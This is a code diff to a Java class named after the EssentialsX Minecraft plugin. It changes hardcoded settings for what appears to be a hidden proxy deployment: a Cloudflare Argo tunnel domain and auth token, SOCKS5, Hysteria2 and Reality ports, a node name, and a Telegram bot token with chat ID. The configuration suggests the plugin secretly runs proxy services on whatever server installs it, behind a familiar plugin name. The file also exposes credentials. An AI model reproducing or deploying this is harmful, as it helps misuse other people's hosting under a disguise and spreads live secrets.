@@ -75,20 +75,20 @@ public class EssentialsX extends JavaPlugin {
         env.put("UUID", "45a57b6b-753c-4b7d-8b2f-26062b3262cc");
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "fmh.1791765.xyz");
-        env.put("ARGO_AUTH", "eyJhIjoiZDY1NWNiOTk2NzNlZTYzMDE4NDFkMmQyNmYxNTY5N2EiLCJ0IjoiZTY1NDVmZTEtOGQ0Mi00NjJkLThhM2ItMTRlMmJiM2M0MzEyIiwicyI6IllUVXdObVk0WlRZdFlqUmhNaTAwTlRBeUxXRTJOamd0TURaaE9HVTBZelk1T0dSbCJ9");
-        env.put("S5_PORT", "5079");
-        env.put("HY2_PORT", "5079");
+        env.put("ARGO_DOMAIN", "back.gf88.ggff.net");
+        env.put("ARGO_AUTH", "eyJhIjoiZDY1NWNiOTk2NzNlZTYzMDE4NDFkMmQyNmYxNTY5N2EiLCJ0IjoiMjgwMTliZGUtYjJlMC00NzYwLWJmMTUtYTU1MGQ2NzgwZjU4IiwicyI6IllUa3labUV5WkdVdE5EZGhaaTAwTldVd0xUa3hOR1V0TVRreU1UaGpOV00zTURnMyJ9");
+        env.put("S5_PORT", "4441");
+        env.put("HY2_PORT", "4441");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("REALITY_PORT", "4442");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "8093926960");
         env.put("BOT_TOKEN", "8396677288:AAGCpsBEDOjKkQuuNZgk7U3xanOsKS2M6U8");
         env.put("CFIP", "store.ubi.com");
         env.put("CFPORT", "443");
-        env.put("NAME", "FMH");
+        env.put("NAME", "Bytenut");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
